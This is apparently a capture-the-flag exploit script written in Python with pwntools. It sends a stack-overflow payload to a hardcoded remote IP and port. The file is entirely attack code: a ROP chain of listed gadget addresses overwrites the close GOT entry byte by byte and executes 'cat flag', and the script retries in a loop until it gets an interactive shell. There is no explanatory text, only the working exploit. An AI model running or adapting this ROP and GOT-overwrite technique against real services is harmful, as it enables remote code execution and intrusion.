from pwn import *

def adj(dicc):
    if dicc < 0:
        return 0x10000000000000000 + dicc
    return dicc

while True:
    r = remote("178.128.87.12", 31338 )
    #r = process("./one2", env={"LD_PRELOAD":"./libc-2.24.so"})
    poprbp = 0x00000000004005c0
    bss = 0x000601100
    readplt = 0x0000000000400540
    readgot = 0x601030
    poprdi = 0x0000000000400843
    poprsi = 0x0000000000400841
    poprsp = 0x000000000040083d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    bigdiccgadget = 0x4006D8
    clgadget = 0x00000000004006f6# add byte ptr [rbx + 0x5d5bf445], cl; ret;
    poprbx = 0x00000000004006fa # pop rbx ; pop rbp ; ret
    closegot = 0x601028
    exitgot = 0x601038
    alarmgot = 0x601020

    cmd = "cat flag | whatever"
    payload = p32(0x8a919ff0) + "\xf6AAA\x37BBB\x40CCC" + cmd + "B"*(132-12-len(cmd))

    payload += p64(0x400660)
    payload += p64(poprbx)
    payload += p64(adj(closegot+2 - 0x5d5bf445))
    payload += p64(0x0)
    payload += p64(clgadget)
    payload += p64(0x400660)
    payload += p64(poprbx)
    payload += p64(adj(closegot+1 - 0x5d5bf445))
    payload += p64(0x0)
    payload += p64(clgadget)
    payload += p64(0x400660)
    payload += p64(poprbx)
    payload += p64(adj(closegot - 0x5d5bf445))
    payload += p64(bss)
    payload += p64(clgadget)
    payload += p64(0x400530)

    print payload
    print hex(len(payload))

    r.sendline(payload)
    try:
        dicc = r.recvuntil("Segmentation", timeout=5)
        if "Segmentation" not in dicc:
            r.interactive()
    except:
        pass

    r.close()
